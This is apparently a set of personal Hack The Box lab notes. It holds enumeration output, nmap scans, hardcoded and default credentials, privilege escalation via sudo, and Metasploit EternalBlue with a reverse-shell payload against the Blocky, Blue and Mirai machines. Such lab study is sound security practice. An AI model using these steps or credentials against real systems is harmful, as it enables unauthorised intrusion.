/>-rwxr-xr-x  1 root root 1293 Mar 13  2014 killprocs<br />-rwxr-xr-x  1 root root 1990 Jan 22  2013 kmod<br />-rwxr-xr-x  1 root root 5491 Feb 19  2014 mysql<br />-rwxr-xr-x  1 root root 4479 Mar 20  2014 networking<br />-rwxr-xr-x  1 root root 1581 Feb 17  2016 ondemand<br />-rwxr-xr-x  1 root root 1466 Mar 11  2014 open-vm-tools<br />-rwxr-xr-x  1 root root  561 Apr 21  2015 pppd-dns<br />-rwxr-xr-x  1 root root 1192 May 27  2013 procps<br />-rwxr-xr-x  1 root root 6120 Mar 13  2014 rc<br />-rwxr-xr-x  1 root root  782 Mar 13  2014 rc.local<br />-rwxr-xr-x  1 root root  117 Mar 13  2014 rcS<br />-rwxr-xr-x  1 root root  639 Mar 13  2014 reboot<br />-rwxr-xr-x  1 root root 2918 Jun 13  2014 resolvconf<br />-rwxr-xr-x  1 root root 4395 Jan 20  2016 rsync<br />-rwxr-xr-x  1 root root 2913 Dec  4  2013 rsyslog<br />-rwxr-xr-x  1 root root 1226 Jul 22  2013 screen-cleanup<br />-rwxr-xr-x  1 root root 3920 Mar 13  2014 sendsigs<br />-rwxr-xr-x  1 root root  590 Mar 13  2014 single<br />-rw-r--r--  1 root root 4290 Mar 13  2014 skeleton<br />-rwxr-xr-x  1 root root 4077 May  2  2014 ssh<br />-rwxr-xr-x  1 root root  731 Feb  5  2014 sudo<br />-rwxr-xr-x  1 root root 6173 Apr 14  2014 udev<br />-rwxr-xr-x  1 root root 2721 Mar 13  2014 umountfs<br />-rwxr-xr-x  1 root root 2260 Mar 13  2014 umountnfs.sh<br />-rwxr-xr-x  1 root root 1872 Mar 13  2014 umountroot<br />-rwxr-xr-x  1 root root 1361 Dec  6  2013 unattended-upgrades<br />-rwxr-xr-x  1 root root 3111 Mar 13  2014 urandom<br />-e <br /><br />-e \e[00;31m[-] /etc/init/ config file permissions:\e[00m<br />total 336<br />drwxr-xr-x  2 root root 4096 Jun 15  2017 .<br />drwxr-xr-x 96 root root 4096 Jul 20 18:26 ..<br />-rw-r--r--  1 root root  320 Apr  3  2014 acpid.conf<br />-rw-r--r--  1 root root 1582 May 18  2016 apport.conf<br />-rw-r--r--  1 root root  261 Oct 21  2013 atd.conf<br />-rw-r--r--  1 root root  328 Feb 22  2014 bootmisc.sh.conf<br />-rw-r--r--  1 root root  232 Feb 22  2014 checkfs.sh.conf<br />-rw-r--r--  1 root root  253 Feb 22  2014 checkroot-bootclean.sh.conf<br />-rw-r--r--  1 root root  307 Feb 22  2014 checkroot.sh.conf<br />-rw-r--r--  1 root root  250 Oct  9  2012 console-font.conf<br />-rw-r--r--  1 root root  509 Dec 21  2010 console-setup.conf<br />-rw-r--r--  1 root root  266 Apr 12  2014 console.conf<br />-rw-r--r--  1 root root 1122 Apr 12  2014 container-detect.conf<br />-rw-r--r--  1 root root  356 Apr 12  2014 control-alt-delete.conf<br />-rw-r--r--  1 root root  297 Feb  9  2013 cron.conf<br />-rw-r--r--  1 root root  489 Nov 11  2013 dbus.conf<br />-rw-r--r--  1 root root  273 Nov 19  2010 dmesg.conf<br />-rw-r--r--  1 root root 1377 Apr 12  2014 failsafe.conf<br />-rw-r--r--  1 root root  267 Apr 12  2014 flush-early-job-log.conf<br />-rw-r--r--  1 root root 1247 Mar 14  2012 friendly-recovery.conf<br />-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf<br />-rw-r--r--  1 root root  444 Apr 16  2014 hwclock-save.conf<br />-rw-r--r--  1 root root  557 Apr 16  2014 hwclock.conf<br />-rw-r--r--  1 root root  579 Aug 26  2014 irqbalance.conf<br />-rw-r--r--  1 root root  689 Apr 10  2014 kmod.conf<br />-rw-r--r--  1 root root  268 Feb 22  2014 mountall-bootclean.sh.conf<br />-rw-r--r--  1 root root  349 Feb 22  2014 mountall-net.conf<br />-rw-r--r--  1 root root  261 Feb 22  2014 mountall-reboot.conf<br />-rw-r--r--  1 root root 1201 Feb 22  2014 mountall-shell.conf<br />-rw-r--r--  1 root root 1232 Feb 22  2014 mountall.conf<br />-rw-r--r--  1 root root  311 Feb 22  2014 mountall.sh.conf<br />-rw-r--r--  1 root root  327 Feb 22  2014 mountdevsubfs.sh.conf<br />-rw-r--r--  1 root root  405 Feb 22  2014 mounted-debugfs.conf<br />-rw-r--r--  1 root root  730 Feb 22  2014 mounted-dev.conf<br />-rw-r--r--  1 root root  480 Feb 22  2014 mounted-proc.conf<br />-rw-r--r--  1 root root  618 Feb 22  2014 mounted-run.conf<br />-rw-r--r--  1 root root 1890 Feb 22  2014 mounted-tmp.conf<br />-rw-r--r--  1 root root  903 Feb 22  2014 mounted-var.conf<br />-rw-r--r--  1 root root  323 Feb 22  2014 mountkernfs.sh.conf<br />-rw-r--r--  1 root root  249 Feb 22  2014 mountnfs-bootclean.sh.conf<br />-rw-r--r--  1 root root  313 Feb 22  2014 mountnfs.sh.conf<br />-rw-r--r--  1 root root  238 Feb 22  2014 mtab.sh.conf<br />-rw-r--r--  1 root root 1770 Feb 19  2014 mysql.conf<br />-rw-r--r--  1 root root  530 Mar 20  2014 network-interface-container.conf<br />-rw-r--r--  1 root root 1756 May  4  2013 network-interface-security.conf<br />-rw-r--r--  1 root root 1109 May  8  2014 network-interface.conf<br />-rw-r--r--  1 root root 2493 Mar 20  2014 networking.conf<br />-rw-r--r--  1 root root  534 Feb 17  2014 passwd.conf<br />-rw-r--r--  1 root root  326 Mar 13  2014 plymouth-log.conf<br />-rw-r--r--  1 root root  675 Mar 13  2014 plymouth-ready.conf<br />-rw-r--r--  1 root root  778 Mar 13  2014 plymouth-shutdown.conf<br />-rw-r--r--  1 root root  899 Mar 13  2014 plymouth-splash.conf<br />-rw-r--r--  1 root root  796 Mar 13  2014 plymouth-stop.conf<br />-rw-r--r--  1 root root  421 Apr 11  2014 plymouth-upstart-bridge.conf<br />-rw-r--r--  1 root root  519 Mar 13  2014 plymouth.conf<br />-rw-r--r--  1 root root  363 Jan  6  2014 procps.conf<br />-rw-r--r--  1 root root 1543 Apr 12  2014 rc-sysinit.conf<br />-rw-r--r--  1 root root  661 Apr 12  2014 rc.conf<br />-rw-r--r--  1 root root  683 Apr 12  2014 rcS.conf<br />-rw-r--r--  1 root root  457 Dec 13  2012 resolvconf.conf<br />-rw-r--r--  1 root root  426 Apr 18  2013 rsyslog.conf<br />-rw-r--r--  1 root root  230 Mar 18  2011 setvtrgb.conf<br />-rw-r--r--  1 root root  277 Apr 12  2014 shutdown.conf<br />-rw-r--r--  1 root root  641 May  2  2014 ssh.conf<br />-rw-r--r--  1 root root  711 Mar 13  2014 startpar-bridge.conf<br />-rw-r--r--  1 root root 1183 Oct 29  2014 systemd-logind.conf<br />-rw-r--r--  1 root root  348 Apr 12  2014 tty1.conf<br />-rw-r--r--  1 root root  333 Apr 12  2014 tty2.conf<br />-rw-r--r--  1 root root  333 Apr 12  2014 tty3.conf<br />-rw-r--r--  1 root root  333 Apr 12  2014 tty4.conf<br />-rw-r--r--  1 root root  232 Apr 12  2014 tty5.conf<br />-rw-r--r--  1 root root  232 Apr 12  2014 tty6.conf<br />-rw-r--r--  1 root root  645 Sep 12  2014 udev-fallback-graphics.conf<br />-rw-r--r--  1 root root  768 Apr 14  2014 udev-finish.conf<br />-rw-r--r--  1 root root  337 Apr 14  2014 udev.conf<br />-rw-r--r--  1 root root  356 Apr 14  2014 udevmonitor.conf<br />-rw-r--r--  1 root root  352 Apr 14  2014 udevtrigger.conf<br />-rw-r--r--  1 root root  473 Feb 28  2014 ufw.conf<br />-rw-r--r--  1 root root  412 Apr 12  2014 upstart-file-bridge.conf<br />-rw-r--r--  1 root root  329 Apr 12  2014 upstart-socket-bridge.conf<br />-rw-r--r--  1 root root  553 Apr 12  2014 upstart-udev-bridge.conf<br />-rw-r--r--  1 root root  683 Mar 25  2013 ureadahead-other.conf<br />-rw-r--r--  1 root root  889 Mar 25  2013 ureadahead.conf<br />-rw-r--r--  1 root root 1521 Apr 12  2014 wait-for-state.conf<br />-e <br /><br />-e \e[00;31m[-] /lib/systemd/* config file permissions:\e[00m<br />/lib/systemd/:<br />total 736K<br />drwxr-xr-x 6 root root 4.0K Dec 24  2017 system<br />-rwxr-xr-x 1 root root  66K Feb  7  2017 systemd-hostnamed<br />-rwxr-xr-x 1 root root  70K Feb  7  2017 systemd-localed<br />-rwxr-xr-x 1 root root 254K Feb  7  2017 systemd-logind<br />-rwxr-xr-x 1 root root  22K Feb  7  2017 systemd-multi-seat-x<br />-rwxr-xr-x 1 root root  78K Feb  7  2017 systemd-timedated<br />-rwxr-xr-x 1 root root 230K Feb  7  2017 systemd-udevd<br /><br />/lib/systemd/system:<br />total 100K<br />drwxr-xr-x 2 root root 4.0K Jun 14  2017 dbus.target.wants<br />drwxr-xr-x 2 root root 4.0K Jun 14  2017 multi-user.target.wants<br />drwxr-xr-x 2 root root 4.0K Jun 14  2017 sockets.target.wants<br />drwxr-xr-x 2 root root 4.0K Jun 14  2017 sysinit.target.wants<br />-rw-r--r-- 1 root root  339 Apr 13  2017 bind9-resolvconf.service<br />-rw-r--r-- 1 root root  239 Apr 13  2017 bind9.service<br />lrwxrwxrwx 1 root root   21 Feb  7  2017 udev.service -&gt; systemd-udevd.service<br />-rw-r--r-- 1 root root  823 Feb  7  2017 systemd-udev-settle.service<br />-rw-r--r-- 1 root root  715 Feb  7  2017 systemd-udev-trigger.service<br />-rw-r--r-- 1 root root  578 Feb  7  2017 systemd-udevd-control.socket<br />-rw-r--r-- 1 root root  575 Feb  7  2017 systemd-udevd-kernel.socket<br />-rw-r--r-- 1 root root  788 Feb  7  2017 systemd-udevd.service<br />-rw-r--r-- 1 root root  347 Dec  7  2016 dbus.service<br />-rw-r--r-- 1 root root  106 Dec  7  2016 dbus.socket<br />-rw-r--r-- 1 root root  188 Jan 20  2016 rsync.service<br />-rw-r--r-- 1 root root  248 Nov  9  2015 wpa_supplicant.service<br />-rw-r--r-- 1 root root  199 May  6  2015 rsyslog.service<br />-rwxr-xr-x 1 root root  251 Jun 17  2014 open-vm-tools.service<br />-rw-r--r-- 1 root root  344 May  2  2014 ssh.service<br />-rw-r--r-- 1 root root  216 May  2  2014 ssh.socket<br />-rw-r--r-- 1 root root  196 May  2  2014 ssh@.service<br />-rw-r--r-- 1 root root  155 Apr  3  2014 acpid.service<br />-rw-r--r-- 1 root root  115 Apr  3  2014 acpid.socket<br />-rw-r--r-- 1 root root  272 Feb  5  2014 sudo.service<br />-rw-r--r-- 1 root root  124 Oct 21  2013 atd.service<br />-rw-r--r-- 1 root root  182 Oct 15  2013 polkitd.service<br /><br />/lib/systemd/system/dbus.target.wants:<br />total 0<br />lrwxrwxrwx 1 root root 14 Dec  7  2016 dbus.socket -&gt; ../dbus.socket<br /><br />/lib/systemd/system/multi-user.target.wants:<br />total 0<br />lrwxrwxrwx 1 root root 15 Dec  7  2016 dbus.service -&gt; ../dbus.service<br /><br />/lib/systemd/system/sockets.target.wants:<br />total 0<br />lrwxrwxrwx 1 root root 31 Feb  7  2017 systemd-udevd-control.socket -&gt; ../systemd-udevd-control.socket<br />lrwxrwxrwx 1 root root 30 Feb  7  2017 systemd-udevd-kernel.socket -&gt; ../systemd-udevd-kernel.socket<br />lrwxrwxrwx 1 root root 14 Dec  7  2016 dbus.socket -&gt; ../dbus.socket<br /><br />/lib/systemd/system/sysinit.target.wants:<br />total 0<br />lrwxrwxrwx 1 root root 31 Feb  7  2017 systemd-udev-trigger.service -&gt; ../systemd-udev-trigger.service<br />lrwxrwxrwx 1 root root 24 Feb  7  2017 systemd-udevd.service -&gt; ../systemd-udevd.service<br />-e <br /><br />-e \e[00;33m### SOFTWARE #############################################\e[00m<br />-e \e[00;31m[-] Sudo version:\e[00m<br />Sudo version 1.8.9p5<br />-e <br /><br />-e \e[00;31m[-] MYSQL version:\e[00m<br />mysql  Ver 14.14 Distrib 5.5.55, for debian-linux-gnu (i686) using readline 6.3<br />-e <br /><br />-e \e[00;31m[-] Apache version:\e[00m<br />Server version: Apache/2.4.7 (Ubuntu)<br />Server built:   May  9 2017 16:13:38<br />-e <br /><br />-e \e[00;31m[-] Apache user configuration:\e[00m<br />APACHE_RUN_USER=www-data<br />APACHE_RUN_GROUP=www-data<br />-e <br /><br />-e \e[00;31m[-] Installed Apache modules:\e[00m<br />Loaded Modules:<br /> core_module (static)<br /> so_module (static)<br /> watchdog_module (static)<br /> http_module (static)<br /> log_config_module (static)<br /> logio_module (static)<br /> version_module (static)<br /> unixd_module (static)<br /> access_compat_module (shared)<br /> alias_module (shared)<br /> auth_basic_module (shared)<br /> authn_core_module (shared)<br /> authn_file_module (shared)<br /> authz_core_module (shared)<br /> authz_host_module (shared)<br /> authz_user_module (shared)<br /> autoindex_module (shared)<br /> deflate_module (shared)<br /> dir_module (shared)<br /> env_module (shared)<br /> fcgid_module (shared)<br /> filter_module (shared)<br /> include_module (shared)<br /> mime_module (shared)<br /> mpm_prefork_module (shared)<br /> negotiation_module (shared)<br /> php5_module (shared)<br /> rewrite_module (shared)<br /> setenvif_module (shared)<br /> status_module (shared)<br /> suexec_module (shared)<br />-e <br /><br />-e \e[00;33m### INTERESTING FILES ####################################\e[00m<br />-e \e[00;31m[-] Useful file locations:\e[00m<br />/bin/nc<br />/bin/netcat<br />/usr/bin/wget<br />/usr/bin/nmap<br />/usr/bin/gcc<br />/usr/bin/curl<br />-e <br /><br />-e \e[00;31m[-] Installed compilers:\e[00m<br />ii  g++                                4:4.8.2-1ubuntu6                           i386         GNU C++ compiler<br />ii  g++-4.8                            4.8.4-2ubuntu1~14.04.3                     i386         GNU C++ compiler<br />ii  gcc                                4:4.8.2-1ubuntu6                           i386         GNU C compiler<br />ii  gcc-4.8                            4.8.4-2ubuntu1~14.04.3                     i386         GNU C compiler<br />-e <br /><br />-e \e[00;31m[-] Can we read/write sensitive files:\e[00m<br />-rw-rw-rw- 1 root root 1252 May 28  2017 /etc/passwd<br />-rw-r--r-- 1 root root 707 May 28  2017 /etc/group<br />-rw-r--r-- 1 root root 665 Feb 20  2014 /etc/profile<br />-rw-r----- 1 root shadow 895 Jun 14  2017 /etc/shadow<br />-e <br /><br />-e \e[00;31m[-] SUID files:\e[00m<br />-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency<br />-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br />-rwsr-xr-x 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign<br />-rwsr-xr-- 1 root messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br />-rwsr-xr-x 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1<br />-rwsr-sr-x 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at<br />-rwsr-xr-x 1 root root 35916 May 17  2017 /usr/bin/chsh<br />-rwsr-xr-x 1 root root 45420 May 17  2017 /usr/bin/passwd<br />-rwsr-xr-x 1 root root 44620 May 17  2017 /usr/bin/chfn<br />-rwsr-xr-x 1 root root 18168 Nov 24  2015 /usr/bin/pkexec<br />-rwsr-xr-x 1 root root 30984 May 17  2017 /usr/bin/newgrp<br />-rwsr-xr-x 1 root root 18136 May  8  2014 /usr/bin/traceroute6.iputils<br />-rwsr-xr-x 1 root root 66284 May 17  2017 /usr/bin/gpasswd<br />-rwsr-xr-x 1 root root 156708 May 29  2017 /usr/bin/sudo<br />-rwsr-xr-x 1 root root 72860 Oct 21  2013 /usr/bin/mtr<br />-rwsr-sr-x 1 libuuid libuuid 17996 Nov 24  2016 /usr/sbin/uuidd<br />-rwsr-xr-- 1 root dip 323000 Apr 21  2015 /usr/sbin/pppd<br />-rwsr-xr-x 1 root root 38932 May  8  2014 /bin/ping<br />-rwsr-xr-x 1 root root 43316 May  8  2014 /bin/ping6<br />-rwsr-xr-x 1 root root 35300 May 17  2017 /bin/su<br />-rwsr-xr-x 1 root root 30112 May 15  2015 /bin/fusermount<br />-rwsr-xr-x 1 root root 88752 Nov 24  2016 /bin/mount<br />-rwsr-xr-x 1 root root 67704 Nov 24  2016 /bin/umount<br />-e <br /><br />-e \e[00;33m[+] Possibly interesting SUID files:\e[00m<br />-rwsr-xr-x 1 root root 72860 Oct 21  2013 /usr/bin/mtr<br />-e <br /><br />-e \e[00;31m[-] SGID files:\e[00m<br />-rwsr-sr-x 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at<br />-rwxr-sr-x 3 root mail 9704 Dec  4  2012 /usr/bin/mail-lock<br />-rwxr-sr-x 1 root utmp 406700 Nov  7  2013 /usr/bin/screen<br />-rwxr-sr-x 1 root mlocate 34452 Jun 20  2013 /usr/bin/mlocate<br />-rwxr-sr-x 1 root tty 9748 Jun  4  2013 /usr/bin/bsd-write<br />-rwxr-sr-x 1 root ssh 329144 Aug 11  2016 /usr/bin/ssh-agent<br />-rwxr-sr-x 1 root shadow 53516 May 17  2017 /usr/bin/chage<br />-rwxr-sr-x 1 root tty 18056 Nov 24  2016 /usr/bin/wall<br />-rwxr-sr-x 1 root shadow 18208 May 17  2017 /usr/bin/expiry<br />-rwxr-sr-x 3 root mail 9704 Dec  4  2012 /usr/bin/mail-unlock<br />-rwxr-sr-x 3 root mail 9704 Dec  4  2012 /usr/bin/mail-touchlock<br />-rwxr-sr-x 1 root crontab 34824 Feb  9  2013 /usr/bin/crontab<br />-rwxr-sr-x 1 root mail 13960 Dec  7  2013 /usr/bin/dotlockfile<br />-rwsr-sr-x 1 libuuid libuuid 17996 Nov 24  2016 /usr/sbin/uuidd<br />-rwxr-sr-x 1 root shadow 30432 Mar 16  2016 /sbin/unix_chkpwd<br />-e <br /><br />-e [-] Can&#39;t search *.conf files as no keyword was entered<br /><br />-e [-] Can&#39;t search *.php files as no keyword was entered<br /><br />-e [-] Can&#39;t search *.log files as no keyword was entered<br /><br />-e [-] Can&#39;t search *.ini files as no keyword was entered<br /><br />-e \e[00;31m[-] All *.conf files in /etc (recursive 1 level):\e[00m<br />-rw-r--r-- 1 root root 144 May 28  2017 /etc/kernel-img.conf<br />-rw-r--r-- 1 root root 321 Apr 16  2014 /etc/blkid.conf<br />-rw-r--r-- 1 root root 191 Dec  4  2013 /etc/libaudit.conf<br />-rw-r--r-- 1 root root 1320 Aug 19  2014 /etc/rsyslog.conf<br />-rw-r--r-- 1 root root 1260 Jul  1  2013 /etc/ucf.conf<br />-rw-r--r-- 1 root root 92 Feb 20  2014 /etc/host.conf<br />-rw-r--r-- 1 root root 4781 Nov 15  2013 /etc/hdparm.conf<br />-rw-r--r-- 1 root root 2584 Oct 10  2012 /etc/gai.conf<br />-rw-r--r-- 1 root root 350 May 28  2017 /etc/popularity-contest.conf<br />-rw-r--r-- 1 root root 7788 May 28  2017 /etc/ca-certificates.conf<br />-rw-r--r-- 1 root root 552 Feb  1  2014 /etc/pam.conf<br />-rw-r--r-- 1 root root 2084 Apr  1  2013 /etc/sysctl.conf<br />-rw-r--r-- 1 root root 956 Feb 19  2014 /etc/mke2fs.conf<br />-rw-r--r-- 1 root root 321 Jun 20  2013 /etc/updatedb.conf<br />-rw-r--r-- 1 root root 14867 May 10  2014 /etc/ltrace.conf<br />-rw-r--r-- 1 root root 604 Nov  7  2013 /etc/deluser.conf<br />-rw-r--r-- 1 root root 34 Aug  3  2016 /etc/ld.so.conf<br />-rw-r--r-- 1 root root 2969 Feb 23  2014 /etc/debconf.conf<br />-rw-r--r-- 1 root root 475 Feb 20  2014 /etc/nsswitch.conf<br />-rw-r--r-- 1 root root 2981 Aug  3  2016 /etc/adduser.conf<br />-rw-r----- 1 root fuse 280 May 24  2013 /etc/fuse.conf<br />-rw-r--r-- 1 root root 703 Jan 22  2014 /etc/logrotate.conf<br />-rw-r--r-- 1 root root 771 May 19  2013 /etc/insserv.conf<br />-e <br /><br />-e \e[00;31m[-] Location and contents (if accessible) of .bash_history file(s):\e[00m<br />/home/chris/.bash_history<br />-e <br /><br />-e \e[00;31m[-] Any interesting mail in /var/mail:\e[00m<br />total 8<br />drwxrwsr-x  2 root mail 4096 Aug  3  2016 .<br />drwxr-xr-x 14 root root 4096 May 29  2017 ..<br />-e <br /><br />-e \e[00;33m### SCAN COMPLETE ####################################\e[00m<br /></div><div class='page'><h1 class='title level-4'>10.10.10.37 Blocky</h1><br/>root@kali:~/Desktop/Machines/HTB/Blocky# nmap -sC -sV -oN BlockyNmap.txt 10.10.10.37<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-20 17:08 EDT<br />Nmap scan report for 10.10.10.37<br />Host is up (0.13s latency).<br />Not shown: 996 filtered ports<br />PORT     STATE  SERVICE VERSION<br />21/tcp   open   ftp     ProFTPD 1.3.5a<br />22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)<br />|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)<br />|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)<br />80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-generator: WordPress 4.8<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: BlockyCraft &amp;#8211; Under Construction!<br />8192/tcp closed sophos<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 21.74 seconds<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />possible token 67bd42010f2aafe7bc825fa75103e39d<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />package com.myfirstplugin;<br /><br />public class BlockyCore<br />{<br />  public String sqlHost = &quot;localhost&quot;;<br />  public String sqlUser = &quot;root&quot;;<br />  public String sqlPass = &quot;8YsqfCTnvxAUeduzjNSXe22&quot;;<br />  <br />  public void onServerStart() {}<br />  <br />  public void onServerStop() {}<br />  <br />  public void onPlayerJoin()<br />  {<br />    sendMessage(&quot;TODO get username&quot;, &quot;Welcome to the BlockyCraft!!!!!!!&quot;);<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />ESC[34m[i]ESC[0m User(s) Identified:<br /><br />ESC[32m[+]ESC[0m notch<br /> | Detected By: Author Posts - Author Pattern (Passive Detection)<br /> | Confirmed By:<br /> |  Wp Json Api (Aggressive Detection)<br /> |   - <a href="http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1">http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br /> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> |  Login Error Messages (Aggressive Detection)<br /><br />ESC[32m[+]ESC[0m Notch<br /> | Detected By: Rss Generator (Passive Detection)<br /> | Confirmed By: Login Error Messages (Aggressive Detection)<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />[-] Accounts that have recently used sudo:<br />/home/notch/.sudo_as_admin_successful<br /><br />[-] Jobs held by all users: <a href="file:///etc/crontab">/etc/crontab</a><br />screen-cleanup.service -&gt; /dev/null<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />sudo -l<br />all all all<br />sudo su<br />root.txt!!!!!!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>10.10.10.40 Blue</h1><br/>root@kali:~/Desktop/Machines/HTB# nmap -sC -sV -oN Blue.txt 10.10.10.40<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-14 15:26 EDT<br />Nmap scan report for 10.10.10.40<br />Host is up (0.14s latency).<br />Not shown: 991 closed ports<br />PORT      STATE SERVICE      VERSION<br />135/tcp   open  msrpc        Microsoft Windows RPC<br />139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn<br />445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)<br />49152/tcp open  msrpc        Microsoft Windows RPC<br />49153/tcp open  msrpc        Microsoft Windows RPC<br />49154/tcp open  msrpc        Microsoft Windows RPC<br />49155/tcp open  msrpc        Microsoft Windows RPC<br />49156/tcp open  msrpc        Microsoft Windows RPC<br />49157/tcp open  msrpc        Microsoft Windows RPC<br />Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: -20m24s, deviation: 34m36s, median: -26s<br />| smb-os-discovery: <br />|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)<br />|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional<br />|   Computer name: haris-PC<br />|   NetBIOS computer name: HARIS-PC\x00<br />|   Workgroup: WORKGROUP\x00<br />|_  System time: 2019-07-14T20:27:37+01:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2019-07-14 15:27:36<br />|_  start_date: 2019-07-14 15:24:03<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 75.54 seconds<br /><br /><br />nmap -p 445 --script &quot;safe&quot; -Pn -n -oN Blue_Safe.txt 10.10.10.40<br />smb-vuln-ms17-010:<br />|   VULNERABLE:<br />|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2017-0143<br />|     Risk factor: HIGH<br />|       A critical remote code execution vulnerability exists in Microsoft SMBv1<br />|        servers (ms17-010).<br />|<br />-------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br />Use metasploit<br />    point<br />    shoot<br />    FUN FACT you can use int (tun0) instead of your IP!<br />    <br />windows/smb/ms17_010_eternalblue<br />set payload windows/x64/meterpreter/reverse_tcp<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>10.10.10.48 Mirai</h1><br/>saw that the machine was a raspberry pi. looked up default creds and was able to ssh with them<br />username    pi<br />password    raspberry<br />figured these are defaults so can probaly su -l<br />yup!!<br />root<br />root@raspberrypi:~# cat root.txt<br />I lost my original root.txt! I think I may have a backup on my USB stick...<br />root@raspberrypi:~# lsblk<br />NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT<br />sda      8:0    0   10G  0 disk <br />├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1<br />└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2<br />sdb      8:16   0   10M  0 disk /media/usbstick<br />sr0     11:0    1 1024M  0 rom  <br />loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs<br />root@raspberrypi:~# cd /media/usbstick<br />root@raspberrypi:/media/usbstick# ls<br />damnit.txt  lost+found<br />root@raspberrypi:/media/usbstick# cat damnit.txt<br />Damnit! Sorry man I accidentally deleted your files off the USB stick.<br />Do you know if there is any way to get them back?<br /><br />-James<br />root@raspberrypi:/media/usbstick# <br /></div><div class='page'><h1 class='title level-5'>Enumeration</h1><br/>root@kali:~/Desktop/Machines/HTB/Mirai# nmap -sC -sV -oN Mirai.nmap1 10.10.10.48 <br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-21 18:00 EDT<br />Nmap scan report for 10.10.10.48<br />Host is up (0.14s latency).<br />Not shown: 996 closed ports<br />PORT     STATE SERVICE VERSION<br />22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)<br />|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)<br />|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)<br />|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)<br />53/tcp   open  domain  dnsmasq 2.76<br />| dns-nsid: <br />|_  bind.version: dnsmasq-2.76<br />80/tcp   open  http    lighttpd 1.4.35<br />|_http-server-header: lighttpd/1.4.35<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />1583/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 28.23 seconds<br />---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />root@kali:~/Desktop/Machines/HTB/Mirai# nmap -sV -T4 -p- -oN Mirai.nmap2 10.10.10.48 <br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-21 18:00 EDT<br />Nmap scan report for 10.10.10.48<br />Host is up (0.14s latency).<br />Not shown: 65529 closed ports<br />PORT      STATE SERVICE VERSION<br />22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)<br />53/tcp    open  domain  dnsmasq 2.76<br 